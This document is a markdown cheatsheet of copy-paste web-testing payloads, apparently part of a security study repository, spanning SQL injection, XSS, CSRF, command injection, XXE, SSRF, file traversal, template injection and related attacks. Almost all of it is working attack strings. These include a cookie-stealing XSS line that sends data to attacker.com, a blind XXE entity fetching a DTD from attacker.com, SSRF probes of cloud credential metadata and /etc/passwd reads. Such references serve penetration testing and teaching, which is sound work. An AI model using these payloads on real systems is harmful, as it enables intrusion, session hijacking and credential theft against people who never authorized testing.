# Cheatsheet — Test Payloads Quick Reference

> Fast copy-paste reference for manual testing. Every payload here is standard, widely-published testing syntax (the same level of detail found in OWASP's own testing guide and PortSwigger's Web Security Academy) — use only against systems you're authorized to test. Full explanations and context live in the numbered topic files linked next to each section.

## SQL Injection — [full detail](../04-injection-attacks.md#sql-injection)

```sql
-- Authentication bypass
admin'--
admin' #
' OR '1'='1
' OR '1'='1'--
' OR 1=1--

-- Union-based (adjust column count after testing with ORDER BY)
' ORDER BY 1--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,NULL FROM users--

-- Boolean-blind
' AND 1=1--
' AND 1=2--

-- Time-blind (MySQL / MSSQL / PostgreSQL / Oracle)
' AND IF(1=1,SLEEP(5),0)--                -- MySQL
'; WAITFOR DELAY '0:0:5'--                 -- MSSQL
' AND (SELECT 1 FROM PG_SLEEP(5))--        -- PostgreSQL
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -- Oracle

-- Error-based (MySQL)
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
```

## Cross-Site Scripting (XSS) — [full detail](../05-xss-csrf-and-client-side-attacks.md#cross-site-scripting-xss)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
<script>fetch('https://attacker.com/c?c='+document.cookie)</script>

<!-- Filter-evasion variants -->
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<scr<script>ipt>alert(1)</scr</script>ipt>
```

## Cross-Site Request Forgery (CSRF) — [full detail](../05-xss-csrf-and-client-side-attacks.md#cross-site-request-forgery-csrf)

```html
<!-- Auto-submitting form -->
<form action="https://target.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('f').submit();</script>

<!-- GET-based (if the action accepts GET) -->
<img src="https://target.com/action?param=value" width="0" height="0">
```

## OS Command Injection — [full detail](../04-injection-attacks.md#os-command-injection)

```
; id
; whoami
&& cat /etc/passwd
| id
`id`
$(id)
%0a id                    (URL-encoded newline separator)
```

## LDAP Injection — [full detail](../04-injection-attacks.md#ldap-injection)

```
*)(uid=*))(|(uid=*
*)(|(password=*))
admin)(&(password=*))
```

## XPath Injection — [full detail](../04-injection-attacks.md#xpath-injection)

```
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
```

## XML External Entity (XXE) — [full detail](../07-web-services-api-and-webhook-attacks.md#xml-external-entity-xxe)

```xml
<!-- Local file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>

<!-- SSRF via XXE -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>

<!-- Blind XXE via external DTD (when direct reflection is not available) -->
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe; ]>
```

## Server-Side Request Forgery (SSRF) — [full detail](../02-owasp-top-10-and-web-threats.md#a10-server-side-request-forgery-ssrf)

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/    (AWS metadata)
http://metadata.google.internal/computeMetadata/v1/                   (GCP metadata, needs header)
http://127.0.0.1:22
http://127.0.0.1:6379                                                 (probe internal Redis)
http://localhost/admin
file:///etc/passwd
```

## Local File Inclusion / Directory Traversal — [full detail](../04-injection-attacks.md#local--remote-file-inclusion-lfirfi)

```
../../../../etc/passwd
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
..\..\..\..\windows\win.ini
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

## Server-Side Template Injection (SSTI) — [full detail](../04-injection-attacks.md#server-side-template-injection-ssti)

```
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
{{config}}
```

## CRLF Injection — [full detail](../04-injection-attacks.md#crlf-injection)

```
%0d%0aSet-Cookie:%20session=attacker
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK
```

## Open Redirect — [full detail](../08-other-web-app-attacks.md#unvalidated-redirects-and-forwards)

```
/redirect?url=https://evil.com
/redirect?url=//evil.com                 (protocol-relative, often missed by weak validation)
/redirect?url=https://target.com.evil.com  (subdomain confusion)
/redirect?url=https://target.com%2f%2f@evil.com
```

## NoSQL Injection (bonus — MongoDB-style, relevant to modern REST APIs)

```
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
```

---
**See also:** [commands-and-tools-cheatsheet.md](./commands-and-tools-cheatsheet.md)
